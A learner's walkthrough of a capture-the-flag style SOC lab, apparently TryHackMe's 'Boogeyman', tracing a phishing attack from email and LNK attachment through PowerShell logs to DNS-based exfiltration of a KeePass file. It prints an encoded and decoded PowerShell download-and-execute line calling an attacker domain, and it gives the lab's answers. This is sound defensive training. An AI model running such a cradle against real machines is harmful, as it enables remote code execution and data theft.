SOC Level 1 Capstone: Boogeyman

Objective: ﻿Uncover the secrets of the new emerging threat, the Boogeyman.

In this room, you will be tasked to analyse the Tactics, Techniques, and Procedures (TTPs) executed by a threat group, from obtaining initial access until achieving its objective.

Skills

This room may require the combined knowledge gained from the SOC L1 Pathway. We recommend going through the following rooms before attempting this challenge.






Tools:

﻿The provided VM contains the following tools at your disposal:

Thunderbird - a free and open-source cross-platform email client.

- a python package for forensics of a binary file with LNK extension.

Wireshark - GUI-based packet analyser.

Tshark - CLI-based Wireshark.

jq - a lightweight and flexible command-line JSON processor.


Task 2 Email Analysis – Look at those headers!

The Boogeyman is here!

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.


The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.

You are tasked to analyse and assess the impact of the compromise.

Investigation Guide

Given the initial information, we know that the compromise started with a phishing email. Let's start with analysing the dump.eml file located in the artefacts directory. There are two ways to analyse the headers and rebuild the attachment:

An alternative and easier way to do this is to double-click the EML file to open it via Thunderbird. The attachment can be saved and extracted accordingly.

Once the payload from the encrypted archive is extracted, use lnkparse to extract the information inside the payload.

ubuntu@tryhackme:~

ubuntu@tryhackme$ lnkparse *LNK FILE*

This will be useful for analyzing the attachment for later.




What is the email address used to send the phishing email?


Opening the email via Thunderbird allows us to get a better look at the header of the email. This tells us that the email is

What is the email address of the victim?Top of Form

Likewise, we see that the email address of the victim is

What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

This one is simple; we just need to scroll down a bit to view both tags.


What is the name of the file inside the encrypted attachment?Top of Form

This was found with the set up we did earlier. After extracting the Invoice.zip file the result is Invoice_20230103.lnk

What is the password of the encrypted attachment?Top of Form

The password is in the email: Invoice2023!

Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

Scrolling through the results of lnkparse shows us that there were command line arguments containing some encoded payload: aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==

Task 3 Endpoint Security – Are you sure that’s an Invoice?

Based on the initial findings, we discovered how the malicious attachment compromised Julianne's workstation:

A PowerShell command was executed.

Decoding the payload reveals the starting point of endpoint activities.

Investigation Guide

With the following discoveries, we should now proceed with analysing the PowerShell logs to uncover the potential impact of the attack:

Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.

Since the given data is JSON, we can parse it in CLI using the jq command.

Note that some logs are redundant and do not contain any critical information; hence can be ignored.

JQ Cheatsheet

﻿jq is a lightweight and flexible command-line JSON processor. This tool can be used in conjunction with other text-processing commands.

You may use the following table as a guide in parsing the logs in this task.

Note: You must be familiar with the existing fields in a single log.


What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

First, we should decode the payload from earlier, which gives us one domain:

i.e.x. .(.n.e.w.-.o.b.j.e.c.t. .n.e.t...w.e.b.c.l.i.e.n.t.)...d.o.w.n.l.o.a.d.s.t.r.i.n.g.(.'.h.t.t.p.:././.f.i.l.e.s...b.p.a.k.c.a.g.i.n.g...x.y.z./.u.p.d.a.t.e.'.).

Next, we will use jq to parse the powershell.json file. Since this is my first time using jq, I copied one of the commands from the cheatsheet to sort by timestamp and print multiple field values, and added a filter for only unique entries.

cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq

Within the results, the first domain from earlier was present, but another domain showed up: cdn.bpakcaging.xyz on port 8080.

What is the name of the enumeration tool downloaded by the attacker?

I found a suspicious looking exe file in the same query from above. It doesn’t sound like a standard program.

Top of Form

Bottom of Form

What is the file accessed by the attacker using the downloaded sq3.exe binary?

By grepping the command we see an incomplete file path:

Noticing plum.sqlite, I refined my query to search for that instead, but nothing else came up. I then realized that the screenshot to the previous question gave me the hint I needed to figure it out, as the attacker changed directories quite a bit, which allows me to construct the full path by adding cd to the grep command:

C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite

What is the software that uses the file in Q3? (previous question)

It’s mentioned in the file path: Microsoft Sticky Notes

What is the name of the exfiltrated file?

Looking back at the full query from earlier, there’s another file that is present in j.westcotts document’s folder, which is alarming.

What type of file uses the .kdbx file extension?

Doing some quick research reveals that this extension is used by KeePass and other password managers to store encrypted password databases.

What is the encoding used during the exfiltration attempt of the sensitive file?Top of Form

Hex is used. It also tells us the destination IP address which will be helpful later.


What is the tool used for exfiltration?











Task 4 Network Traffic Analysis – They got us. Call the bank immediately!








Based on the PowerShell logs investigation, we have seen the full impact of the attack:

The threat actor was able to read and exfiltrate two potentially sensitive files.

The domains and ports used for the network activity were discovered, including the tool used by the threat actor for exfiltration.

Investigation Guide

Finally, we can complete the investigation by understanding the network traffic caused by the attack:

Utilize the domains and ports discovered from the previous task.

All commands executed by the attacker and all command outputs were logged and stored in the packet capture.

Follow the streams of the notable commands discovered from PowerShell logs.

Based on the PowerShell logs, we can retrieve the contents of the exfiltrated data by understanding how it was encoded and extracted.

What software is used by the attacker to host its presumed file/payload server?

Luckily for me, Wireshark is installed on the VM provided, which will make traffic analysis easier. Filtering the packets by files.bpakcaging.xyz gives us a couple packets to work with. I checked the one with sq3.exe and followed the tcp stream, which gives us the header information, along with the software used: Python.

What HTTP method is used by the C2 for the output of the commands executed by the attacker?

This one is simple, it’s just POST.

What is the protocol used during the exfiltration activity?

Since nslookup was used, DNS.

What is the password of the exfiltrated file?

The hint provided says the password is store in the database file accessed by the hacker using the sq3.exe binary. With this I searched for sq3 in wireshark, and checked through all the packets by following the TCP stream, and changing streams, resulting in this stream of numbers. I took an educated guess that it was the code I was looking for and used Cyberchef to decode from decimal and I was correct.



What is the credit card number stored inside the exfiltrated file?

The hint for this reveals that I can retrieve the exfiltrated file using Tshark and to focus on the query type used showed in the PowerShell logs. The query in question is DNS, so using “tshark -r capture.pcapng  -Y 'dns' -T fields -e dns.qry.name” gives us a longs list of queries. I grepped the command to filter it down to the malicious domain that we discovered in this investigation. Looking through the results, the queries are encoded in hex, which means I needed to find a way to only get the hex values. I used ‘.’ as a delimiter, and then I converted the file back into plaintext. This since the exfiltrated file was the KeePass file, I loaded it into Keypass. However, I had trouble saving the file to the VM since I decoded it with Cyberchef, and internet access wasn’t available and the VM didn’t have an offline version, so I downloaded it on my machine.

And we can see the account number.

